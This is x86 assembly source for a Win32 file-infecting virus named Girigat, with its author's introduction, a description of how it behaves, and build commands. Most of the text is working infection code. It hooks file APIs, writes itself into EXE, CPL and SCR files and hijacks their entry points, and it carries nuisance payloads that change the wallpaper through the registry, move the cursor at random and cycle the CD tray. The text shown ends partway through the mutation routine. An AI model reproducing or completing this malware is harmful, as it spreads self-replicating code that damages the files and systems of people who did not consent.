;
;                         ÜÜ     ÜÜÜ      ÜÜ  ÜÜ    ÜÜÜÜ
;                       Üß  ß Û Û  Üß Û Üß  ß Û Û ßß Û
;                       Û  ÜÜ Û ÛßßÜ  Û Û  ÜÜ ÛÜÜÛ   Û
;                       Û   Û Û Û  Û  Û Û   Û Û  Û  Û
;                        ßßß Üß    Û Üß  ßßß     Û ß
;                                 ß             Û
;                            by Mister Sandman ß
;
; ÄÄ´ Introduction ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
;   This new creation of mine has turned to be my first "pure" Win32 virus,
;   as well as one of which i'm really proud of. After an absence of months
;   in which i haven't coded absolutely anything because of certain reasons
;   i won't explain here, i see Girigat as a new start in my VX career.
;
;   My style has changed, and i am not referring to the fact that of course
;   Win32 viruses have nothing to do with DOS viruses. I am sure these dif-
;   ferences i'm writing about are relevant enough so that i do not have to
;   explain them all here... it is all about the point of view computer vi-
;   ruses are interpreted by every virus writer. In my own case my point of
;   view changed in the last months, and here is the result... which i hope
;   to be the first of a long series of viruses i pretend to write. With no
;   schedules, with no goals, with no pressure. Just my way, trying to show
;   by means of my code who the real Mister Sandman is.
;
; ÄÄ´ Behavior ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
;   Girigat is a 4937 bytes long Win32 virus. It changes its behavior auto-
;   matically whenever it jumps to a new computer, so describing the way it
;   works would not be a too reliable source of information. Hence, it is a
;   good idea to explain what it may become, rather than what it is at this
;   moment, in the current compiled version. Girigat may turn either into a
;   per-process resident virus, or into a runtime one, or even into a mixed
;   version which would infect by means of both runtime and resident infec-
;   tion routines. Also, it may infect CPL, EXE or SCR files, including all
;   the possible combinations, among these three file formats. Last but not
;   least, its runtime routines may infect either in the current directory,
;   or in the Windows folder, or in both at once.
;
;   Hooked API functions are CreateFile, FindFirstFile and FindNextFile, in
;   both their ANSI and Unicode versions. Whenever an infected file is exe-
;   cuted three months after the day in which it got infected there will be
;   a 50% probability, of getting one of the four virus payloads triggered.
;   The first of them drops a BMP file with the virus logo and then sets it
;   as the new system wallpaper, on a black background, after the next sys-
;   tem reboot. The second possible payload gets the Windows cursor jumping
;   all over the screen, moving to a random position every half second more
;   or less. The third payload displays by means of a shell message box the
;   system information, including the copyright strings of Girigat, as well
;   as including an alert icon instead of the original Windows logo. Final-
;   ly, the fourth virus payload consists on producing a Poltergesitish ef-
;   fect, which will keep on opening and closing the CD tray all the time.
;
; ÄÄ´ What does "Girigat" mean? ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
;   The virus name, is the result of the latin transliteration of the hindi
;   word used to refer to a chameleon. I decided to call it this way becau-
;   se of the routine it uses to change its own behavior, and because of my
;   admiration to India, which is with no doubt one of the most interesting
;   countries all over the world. The BMP logo Girigat drops, in one of its
;   four payloads, is an image of the way the virus name looks like written
;   in the devanagari alphabet (the official one for the hindi language).
;
;   Besides of the above reasons, i should add that, chameleons have a very
;   special meaning in my life. Albeit nowadays i have only one chameleon i
;   have had four specimens at the same time in the past years. Also, in my
;   right arm there's a big chameleon tattooed in the tribal style together
;   with more tribal designs, which is more or less significative, in which
;   concerns to the relevance of these reptiles to me.
;
; ÄÄ´ Greetings ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
;   I would like to dedicate this virus to my girlfriend Miss Sandwoman, as
;   it is the less i could do for her in order to compensate everything she
;   has done for me, especially in which concerns to this virus since she's
;   always been encouraging and pulling me to finish it. I'd like to greet,
;   as well, my friend Shaitan, since he's from India. Hope he'll like this
;   virus, with which he will surely get identified.
;
; ÄÄ´ Compiling instructions ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
;   tasm32 -ml -m5 -q -zn Girigat.asm
;   tlink32 -Tpe -aa -c -x Girigat.obj,Girigat.exe,,Import32.lib
;   pewrsec Girigat.exe


                .386p
                .model  flat

; ÄÄ´ Imported API functions ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

                extrn   GetModuleHandleA:NEAR
                extrn   MessageBoxA:NEAR
                extrn   ExitProcess:NEAR

; ÍÍ¹ Virus setup routines ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

                .code
global_start    label   byte

file_entry:     call    delta_offset
delta_offset:   pop     ebp
                mov     ebx,ebp
                sub     ebp,offset delta_offset

                db      81h,0ebh
base_address    dd      global_start-base_default+5

                db      0b8h
rva_entry       dd      host_code-base_default

                add     eax,ebx
                push    eax

                mov     ecx,11h
                lea     eax,dword ptr [ebp+sz_gmhandlea]
                call    get_it_api

                cmp     eax,0ffffffffh
                je      try_unicode

                lea     edx,dword ptr [ebp+sz_kernel32]
                mov     dword ptr [ebp+ad_gmhandlea],eax
                jmp     getk32handle

try_unicode:    mov     ecx,11h
                lea     eax,dword ptr [ebp+sz_gmhandlew]
                call    get_it_api

                cmp     eax,0ffffffffh
                je      back_to_host

                lea     edx,dword ptr [ebp+sz_kernel32]
getk32handle:   push    edx
                call    eax

                mov     ecx,0eh
                mov     dword ptr [ebp+ad_kernel32],eax
                lea     eax,dword ptr [ebp+sz_gpaddress]
                call    get_et_api

                cmp     eax,0ffffffffh
                je      back_to_host

                cld
                mov     dword ptr [ebp+ad_gpaddress],eax
                mov     ecx,(offset @sz_apis_end-offset @sz_apis_start)/4
                lea     esi,dword ptr [ebp+@sz_apis_start]
                lea     edi,dword ptr [ebp+ad_apis_start]

setup_apis:     lodsd
                add     eax,ebp
                push    ecx esi edi eax
                push    dword ptr [ebp+ad_kernel32]
                call    dword ptr [ebp+ad_gpaddress]

                pop     edi esi ecx
                or      eax,eax
                jz      back_to_host

                cld
                stosd
                loop    setup_apis

; ÄÄ´ Computer name check ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

                lea     eax,dword ptr [ebp+buffer_size]
                lea     esi,dword ptr [ebp+dir_buffer]
                lea     edi,dword ptr [ebp+sz_comp_name]
                push    esi edi eax esi
                call    dword ptr [ebp+ad_gcompname]

check_machine:  lodsb
                or      al,al
                jz      check_payload

                scasb
                je      check_machine

                pop     edi esi
                push    esi edi
                add     esi,9
                mov     byte ptr [esi],0

                call    dword ptr [ebp+ad_lstrcpy]
                call    chromatos
                jmp     compare_date

; ÄÄ´ Activation day check ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

check_payload:  pop     edi esi
compare_date:   mov     dword ptr [ebp+buffer_size],102h
                lea     eax,dword ptr [ebp+current_time]
                push    eax
                call    dword ptr [ebp+ad_getsystime]

                mov     ax,word ptr [ebp+birth_day]
                cmp     ax,word ptr [ebp+current_day]
                jne     viral_work

                mov     ax,3
                add     ax,word ptr [ebp+birth_month]
                cmp     ax,0ch
                jbe     my_birthday?

                sub     ax,0ch
my_birthday?:   cmp     ax,word ptr [ebp+current_month]
                jne     viral_work

; ÄÄ´ Payload API setup ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

                lea     eax,dword ptr [ebp+sz_user32]
                push    eax
                call    dword ptr [ebp+ad_loadlibrary]
                or      eax,eax
                jz      viral_work

                mov     esi,eax
                lea     edx,dword ptr [ebp+sz_setcurpos]
                push    edx eax
                call    dword ptr [ebp+ad_gpaddress]
                or      eax,eax
                jz      viral_work

                mov     dword ptr [ebp+ad_setcurpos],eax
                lea     edx,dword ptr [ebp+sz_loadicon]
                push    edx esi
                call    dword ptr [ebp+ad_gpaddress]
                or      eax,eax
                jz      viral_work

                mov     dword ptr [ebp+ad_loadicon],eax
                lea     eax,dword ptr [ebp+sz_winmm]
                push    eax
                call    dword ptr [ebp+ad_loadlibrary]
                or      eax,eax
                jz      viral_work

                lea     edx,dword ptr [ebp+sz_mcisendstr]
                push    edx eax
                call    dword ptr [ebp+ad_gpaddress]
                or      eax,eax
                jz      viral_work

                mov     dword ptr [ebp+ad_mcisendstr],eax
                lea     eax,dword ptr [ebp+sz_shell32]
                push    eax
                call    dword ptr [ebp+ad_loadlibrary]
                or      eax,eax
                jz      viral_work

                lea     edx,dword ptr [ebp+sz_shellabout]
                push    edx eax
                call    dword ptr [ebp+ad_gpaddress]
                or      eax,eax
                jz      viral_work

                mov     dword ptr [ebp+ad_shellabout],eax
                lea     eax,dword ptr [ebp+sz_advapi32]
                push    eax
                call    dword ptr [ebp+ad_loadlibrary]
                or      eax,eax
                jz      viral_work

                mov     esi,eax
                lea     edx,dword ptr [ebp+sz_regopenkey]
                push    edx eax
                call    dword ptr [ebp+ad_gpaddress]
                or      eax,eax
                jz      viral_work

                mov     dword ptr [ebp+ad_regopenkey],eax
                lea     edx,dword ptr [ebp+sz_regsetvalue]
                push    edx esi
                call    dword ptr [ebp+ad_gpaddress]
                or      eax,eax
                jz      viral_work

                mov     dword ptr [ebp+ad_regsetvalue],eax

; ÄÄ´ Payload election ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

                mov     eax,1
                call    pseudorandom
                or      eax,eax
                jnz     viral_work

                mov     eax,((offset @payloads_end-offset @payloads_start)/4)-1
                lea     esi,dword ptr [ebp+@payloads_start]
                call    pseudorandom

                mov     ecx,4
                mul     ecx
                add     esi,eax

                lodsd
                add     eax,ebp
                call    eax

; ÄÄ´ Start of real virus activity ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

viral_work:     cmp     byte ptr [ebp+flag_hooking],OFF
                je      only_runtime

                call    apihook_cepa
                cmp     byte ptr [ebp+flag_runtime],OFF
                je      back_to_host

only_runtime:   call    runtime_cepa
back_to_host:   ret

; ÍÍ¹ Direct action routines ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

runtime_cepa:   cmp     byte ptr [ebp+flag_curdir],OFF
                je      go_for_windir

                lea     eax,dword ptr [ebp+dir_buffer]
                push    eax 104h
                call    dword ptr [ebp+ad_getcurdir]
                or      eax,eax
                jz      go_for_windir
                call    look_for_food

go_for_windir:  cmp     byte ptr [ebp+flag_windir],OFF
                je      runtime_done

                lea     eax,dword ptr [ebp+dir_buffer]
                push    104h eax
                call    dword ptr [ebp+ad_getwindir]
                or      eax,eax
                jz      runtime_done
                call    look_for_food

; ÄÄ´ Appropriate victim search routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

look_for_food:  cmp     eax,4
                jb      runtime_done

                mov     edx,eax
                lea     esi,dword ptr [ebp+sz_wildcard]
                call    add_wildcard

                lea     eax,dword ptr [ebp+win32_finddata]
                lea     edx,dword ptr [ebp+dir_buffer]
                push    eax edx
                call    dword ptr [ebp+ad_findfirst]

                cmp     eax,0ffffffffh
                je      runtime_done

                mov     dword ptr [ebp+handle_search],eax
check_victim:   cmp     dword ptr [ebp+win32_finddata+1ch],0
                jne     find_next

                mov     eax,dword ptr [ebp+win32_finddata+20h]
                cmp     eax,0ffffffffh-(size_in_file+1000h)
                jae     find_next

                cld
                lea     esi,dword ptr [ebp+dir_buffer]
                mov     edx,esi

skip_slashes:   lodsb
                cmp     al,'\'
                jne     check_asciiz

                mov     edx,esi
check_asciiz:   or      al,al
                jne     skip_slashes

                lea     esi,dword ptr [ebp+win32_finddata+2ch]
                mov     edi,edx

process_name:   lodsb
                cmp     al,'a'
                jb      copy_filename

                sub     al,('a'-'A')
copy_filename:  stosb
                or      al,al
                jnz     process_name

                mov     eax,dword ptr [edi-5]
                lea     edx,dword ptr [ebp+dir_buffer]
                call    manage_file

find_next:      lea     eax,dword ptr [ebp+win32_finddata]
                push    eax dword ptr [ebp+handle_search]
                call    dword ptr [ebp+ad_findnext]
                or      eax,eax
                jnz     check_victim

                push    dword ptr [ebp+handle_search]
                call    dword ptr [ebp+ad_findclose]
runtime_done:   ret

; ÄÄ´ Infection setup routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

setup_file:     cld
                cmp     word ptr [ebx],'ZM'
                jne     bad_setup

                cmp     word ptr [ebx+12h],');'
                je      bad_setup

                mov     esi,ebx
                add     esi,dword ptr [ebx+3ch]
                mov     word ptr [ebx+12h],');'

                lodsd
                cmp     eax,'EP'
                jne     bad_setup

                mov     ax,word ptr [esi+12h]
                test    ax,2
                jz      bad_setup

                test    ax,2000h
                jnz     bad_setup

                push    word ptr [ebp+current_day]
                pop     word ptr [ebp+birth_day]
                push    word ptr [ebp+current_month]
                pop     word ptr [ebp+birth_month]
                ret

bad_setup:      mov     eax,0ffffffffh
                ret

; ÄÄ´ PE files infection routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

infect_file:    mov     esi,ebx
                mov     dword ptr [ebp+victim_base],ebx
                add     esi,dword ptr [ebx+3ch]
                mov     ebx,esi

                mov     eax,dword ptr [ebx+74h]
                movzx   ecx,word ptr [ebx+6]
                shl     eax,3
                add     eax,78h
                add     eax,ebx
set_write_atb:  or      dword ptr [eax+24h],80000000h
                add     eax,28h
                loop    set_write_atb

                sub     eax,28h
                mov     edx,eax
                mov     eax,dword ptr [edx+0ch]
                add     eax,dword ptr [edx+10h]
                mov     dword ptr [ebp+base_address],eax
                add     dword ptr [ebp+base_address],5

                mov     ecx,dword ptr [ebx+28h]
                mov     dword ptr [ebx+28h],eax
                mov     dword ptr [ebp+rva_entry],ecx

                cld
                mov     ecx,size_in_file
                lea     esi,dword ptr [ebp+global_start]
                mov     edi,dword ptr [edx+14h]
                add     edi,dword ptr [ebp+victim_base]
                add     edi,dword ptr [edx+10h]
                push    ecx
                rep     movsb

                pop     ecx
                add     ecx,dword ptr [edx+10h]
                mov     dword ptr [edx+10h],ecx

                push    ecx
                mov     esi,edx
                xor     edx,edx
                mov     eax,ecx
                mov     ecx,dword ptr [ebx+3ch]
                mov     edi,ecx
                div     ecx
                sub     edi,edx
                pop     ecx
                add     ecx,edi
                mov     dword ptr [esi+8],ecx
                or      dword ptr [esi+24h],20h
                or      dword ptr [esi+24h],20000000h

                mov     eax,dword ptr [esi+0ch]
                add     eax,dword ptr [esi+8]
                mov     dword ptr [ebx+50h],eax
                mov     ebx,dword ptr [ebp+victim_base]
                ret

; ÍÍ¹ API hooking routines ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

apihook_cepa:   lea     eax,dword ptr [ebp+sz_hook_start]
                lea     edi,dword ptr [ebp+dd_hook_start]

h00k_l00p:      mov     ecx,dword ptr [edi]
                or      ecx,ecx
                jz      no_more_hooks

                add     edi,4
                push    eax edi
                call    get_it_api

                xchg    eax,esi
                pop     edi eax
                add     eax,ecx

                cmp     esi,0ffffffffh
                je      try_next_api

                mov     dword ptr [edi],esi
                mov     esi,dword ptr [edi+4]
                add     esi,ebp
                mov     dword ptr [edx],esi

try_next_api:   add     edi,8
                jmp     h00k_l00p
no_more_hooks:  ret

; ÄÄ´ CreateFile(A/W) handler ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

@@createfile:   pushad
                call    get_relative

                mov     byte ptr [ebp+unicode_api],ON
                jmp     crf_entry

@createfile:    pushad
                call    get_relative

crf_entry:      cld
                mov     edx,dword ptr [esp+24h]
                mov     esi,edx

                cmp     byte ptr [ebp+unicode_api],ON
                jne     victim_check

                cmp     byte ptr [esi+1],0
                jne     victim_check

                lea     edi,dword ptr [ebp+dir_buffer]
                push    0 0 104h edi 0ffffffffh esi 0 0
                call    dword ptr [ebp+ad_wide2multi]

                lea     edx,dword ptr [ebp+dir_buffer]
                mov     esi,edx

victim_check:   lodsb
                or      al,al
                jz      pop_and_leave

                cmp     al,'.'
                jne     victim_check

                push    edx
                lea     eax,dword ptr [ebp+win32_finddata]
                push    eax edx
                call    dword ptr [ebp+ad_findfirst]

                push    eax
                call    dword ptr [ebp+ad_findclose]

                pop     edx
                mov     eax,dword ptr [esi-1]
                call    manage_file
pop_and_leave:  popad

                push    ebp
                call    get_relative

                mov     ecx,ebp
                pop     ebp

                cmp     byte ptr [ecx+unicode_api],ON
                jne     jmp_2_crf_a

                mov     byte ptr [ecx+unicode_api],OFF
                jmp     dword ptr [ecx+ad_@crtfile_w]
jmp_2_crf_a:    jmp     dword ptr [ecx+ad_@crtfile_a]

; ÄÄ´ FindFirstFile(A/W) handler ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

@@findfirst:    pushad
                call    get_relative

                mov     byte ptr [ebp+unicode_api],ON
                jmp     ffst_entry

@findfirst:     pushad
                call    get_relative

ffst_entry:     cld
                mov     edx,dword ptr [esp+24h]
                mov     esi,edx

                cmp     byte ptr [ebp+unicode_api],ON
                jne     set_the_scan

                cmp     byte ptr [esi+1],0
                jne     set_the_scan

                lea     edi,dword ptr [ebp+dir_buffer]
                push    0 0 104h edi 0ffffffffh esi 0 0
                call    dword ptr [ebp+ad_wide2multi]

                lea     edx,dword ptr [ebp+dir_buffer]
                mov     esi,edx

set_the_scan:   xor     ecx,ecx
scan_wildcard:  lodsb
                cmp     al,'\'
                jne     check_zero

                mov     ecx,esi
                jmp     scan_wildcard

check_zero:     or      al,al
                jne     scan_wildcard

                mov     esi,edx
                lea     edi,dword ptr [ebp+ff_file_path]
                or      ecx,ecx
                jnz     dont_patch

                mov     ecx,esi
dont_patch:     sub     ecx,esi
                rep     movsb

                mov     byte ptr [edi-1],0
                mov     esi,edx
check_fname:    lodsb
                or      al,al
                jz      dont_do_shit

                cmp     al,'.'
                jne     check_fname

                push    edx
                lea     eax,dword ptr [ebp+win32_finddata]
                push    eax edx
                call    dword ptr [ebp+ad_findfirst]

                push    eax
                call    dword ptr [ebp+ad_findclose]

                pop     edx
                mov     eax,dword ptr [esi-1]
                call    manage_file
dont_do_shit:   popad

                push    ebp
                call    get_relative

                mov     ecx,ebp
                pop     ebp

                cmp     byte ptr [ecx+unicode_api],ON
                jne     jmp_2_ffst_a

                mov     byte ptr [ecx+unicode_api],OFF
                jmp     dword ptr [ecx+ad_@findfst_w]
jmp_2_ffst_a:   jmp     dword ptr [ecx+ad_@findfst_a]

; ÄÄ´ FindNextFile(A/W) handler ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

@@findnext:     pushad
                call    get_relative

                mov     byte ptr [ebp+unicode_api],ON
                jmp     fnxt_entry

@findnext:      pushad
                call    get_relative

fnxt_entry:     cld
                mov     edx,dword ptr [esp+28h]
                add     edx,2ch
                mov     esi,edx

                cmp     byte ptr [ebp+unicode_api],ON
                jne     go_bite_it

                cmp     byte ptr [esi+1],0
                jne     go_bite_it

                lea     edi,dword ptr [ebp+temp_buffer]
                push    0 0 104h edi 0ffffffffh esi 0 0
                call    dword ptr [ebp+ad_wide2multi]

                lea     edx,dword ptr [ebp+temp_buffer]
                mov     esi,edx

go_bite_it:     push    esi
                xor     ecx,ecx
                lea     esi,dword ptr [ebp+ff_file_path]
                lea     edi,dword ptr [ebp+dir_buffer]

move_string:    lodsb
                or      al,al
                jz      cest_fini

                inc     ecx
                stosb
                jmp     move_string

cest_fini:      pop     esi
                mov     edx,ecx
                call    add_wildcard

                lea     edx,dword ptr [ebp+dir_buffer]
                mov     esi,edx

name_lewp:      lodsb
                or      al,al
                jz      back_to_api

                cmp     al,'.'
                jne     name_lewp

                push    edx
                lea     eax,dword ptr [ebp+win32_finddata]
                push    eax edx
                call    dword ptr [ebp+ad_findfirst]

                push    eax
                call    dword ptr [ebp+ad_findclose]

                pop     edx
                mov     eax,dword ptr [esi-1]
                call    manage_file
back_to_api:    popad

                push    ebp
                call    get_relative

                mov     ecx,ebp
                pop     ebp

                cmp     byte ptr [ecx+unicode_api],ON
                jne     jmp_2_fnxt_a

                mov     byte ptr [ecx+unicode_api],OFF
                jmp     dword ptr [ecx+ad_@findnext_w]
jmp_2_fnxt_a:   jmp     dword ptr [ecx+ad_@findnext_a]

; ÍÍ¹ Payload gallery ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

; ÄÄ´ Wallpaper substitution ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

new_wallpaper:  lea     eax,dword ptr [ebp+sz_bmp_file]
                push    0 80h 2 0 0 0c0000000h eax
                call    dword ptr [ebp+ad_createfile]
                or      eax,eax
                jz      wall_is_done

                push    eax
                mov     ecx,bmp_length
                lea     edx,dword ptr [ebp+byte_counter]
                lea     esi,dword ptr [ebp+bmp_start]
                push    0 edx ecx esi eax
                call    dword ptr [ebp+ad_writefile]
                or      eax,eax
                jz      wall_is_done

                pop     eax
                call    dword ptr [ebp+ad_closehandle]

                lea     eax,dword ptr [ebp+handle_key]
                lea     edx,dword ptr [ebp+key_sz_desktop]
                push    eax 2 0 edx 80000001h
                call    dword ptr [ebp+ad_regopenkey]

                mov     edx,dword ptr [ebp+handle_key]
                lea     esi,dword ptr [ebp+key_dd_wpaper]
                lea     edi,dword ptr [ebp+key_sz_tilewp]
                push    2 esi 1 0 edi edx
                call    dword ptr [ebp+ad_regsetvalue]

                lea     esi,dword ptr [ebp+key_dd_wpaper]
                lea     edi,dword ptr [ebp+key_sz_wpstyle]
                push    2 esi 1 0 edi edx
                call    dword ptr [ebp+ad_regsetvalue]

                lea     esi,dword ptr [ebp+sz_bmp_file]
                lea     edi,dword ptr [ebp+key_sz_wpaper]
                push    2 esi 1 0 edi edx
                call    dword ptr [ebp+ad_regsetvalue]

                lea     eax,dword ptr [ebp+handle_key]
                lea     edx,dword ptr [ebp+key_sz_colors]
                push    eax 2 0 edx 80000001h
                call    dword ptr [ebp+ad_regopenkey]

                mov     edx,dword ptr [ebp+handle_key]
                lea     esi,dword ptr [ebp+key_dd_color]
                lea     edi,dword ptr [ebp+key_sz_bgcolor]
                push    2 esi 1 0 edi edx
                call    dword ptr [ebp+ad_regsetvalue]
wall_is_done:   ret

; ÄÄ´ Cursor random positioning ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

crazy_cursor:   mov     eax,250h
                call    pseudorandom

                mov     edx,300h
                xchg    edx,eax
                call    pseudorandom

                push    edx eax
                call    dword ptr [ebp+ad_setcurpos]

                mov     eax,5000000h
delay_eax:      dec     eax
                or      eax,eax
                jnz     delay_eax
                jmp     crazy_cursor

; ÄÄ´ Virus+author credits ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

virus_about:    push    7f03h 0
                call    dword ptr [ebp+ad_loadicon]

                lea     esi,dword ptr [ebp+virus_creds]
                lea     edi,dword ptr [ebp+about_title]
                push    eax esi edi 0
                call    dword ptr [ebp+ad_shellabout]
                ret

; ÄÄ´ CD caddy fun ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

poltergeist:    lea     eax,dword ptr [ebp+sz_open_cd]
                push    0 0 0 eax
                call    dword ptr [ebp+ad_mcisendstr]

                lea     eax,dword ptr [ebp+sz_close_cd]
                push    0 0 0 eax
                call    dword ptr [ebp+ad_mcisendstr]
                jmp     poltergeist

; ÍÍ¹ Viral subroutines ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

; ÄÄ´ Look for a given API in our host's IT ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

get_it_api:     cld
                cmp     word ptr [ebx],'ZM'
                jne     it_api_error

                mov     esi,ebx
                add     esi,dword ptr [ebx+3ch]
                mov     edi,dword ptr [esi]
                cmp     edi,'EP'
                jne     it_api_error

                push    eax
                mov     esi,dword ptr [esi+80h]
                add     esi,ebx
                mov     eax,esi

look_for_k32:   mov     esi,eax
                mov     esi,dword ptr [esi+0ch]
                add     esi,ebx
                cmp     dword ptr [esi],'NREK'
                je      k32_is_here

                add     eax,14h
                jmp     look_for_k32

k32_is_here:    mov     esi,eax
                mov     eax,dword ptr [esi+10h]
                add     eax,ebx
                mov     dword ptr [ebp+imp_tbl_desc],eax
                cmp     dword ptr [esi],0
                je      it_api_error

                pop     edi
                xor     eax,eax
                mov     esi,dword ptr [esi]
                add     esi,ebx
                mov     edx,esi

search_it_api:  cmp     dword ptr [edx],0
                je      it_api_error

                cmp     byte ptr [edx+3],80h
                je      add_and_lewp

                push    ecx edi
                mov     esi,2
                add     esi,ebx
                add     esi,dword ptr [edx]
                repe    cmpsb

                cmp     ecx,0
                pop     edi ecx
                jne     add_and_lewp

                shl     eax,2
                add     eax,dword ptr [ebp+imp_tbl_desc]
                mov     edx,eax
                mov     eax,dword ptr [eax]
                ret

add_and_lewp:   inc     eax
                add     edx,4
                jmp     search_it_api

it_api_error:   mov     eax,0ffffffffh
                ret

; ÄÄ´ Look for a given API in KERNEL32's ET ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

get_et_api:     cld
                push    ebx eax
                mov     ebx,dword ptr [ebp+ad_kernel32]
                cmp     word ptr [ebx],'ZM'
                jne     et_api_error

                mov     esi,dword ptr [ebx+3ch]
                add     esi,ebx

                cmp     word ptr [esi],'EP'
                jne     et_api_error

                mov     esi,dword ptr [esi+78h]
                add     esi,ebx

                mov     eax,dword ptr [esi+1ch]
                add     eax,ebx
                mov     dword ptr [ebp+@functions],eax

                mov     eax,dword ptr [esi+20h]
                add     eax,ebx
                mov     dword ptr [ebp+@names],eax

                mov     eax,dword ptr [esi+24h]
                add     eax,ebx
                mov     dword ptr [ebp+@ordinals],eax
                xor     eax,eax
                pop     esi

search_et_api:  push    ecx esi
                mov     edi,dword ptr [ebp+@names]
                add     edi,eax
                mov     edi,dword ptr [edi]
                add     edi,dword ptr [ebp+ad_kernel32]
                repe    cmpsb

                cmp     ecx,0
                jne     go_for_next

                pop     esi ecx
                shr     eax,1
                xor     ebx,ebx

                add     eax,dword ptr [ebp+@ordinals]
                mov     bx,word ptr [eax]
                shl     ebx,2

                add     ebx,dword ptr [ebp+@functions]
                mov     eax,dword ptr [ebx]
                add     eax,dword ptr [ebp+ad_kernel32]
                pop     ebx
                ret

go_for_next:    pop     esi ecx
                add     eax,4
                jmp     search_et_api

et_api_error:   mov     eax,0ffffffffh
                pop     ebx
                ret

; ÄÄ´ Chromatos self-behavior mutation engine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

chromatos:      mov     ecx,5
                lea     edi,dword ptr [ebp+flags_start]

first_phase:    mov     eax,0ah
                call    pseudorandom
                cmp     eax,4
                jae     activ8_flag

                xor     eax,eax
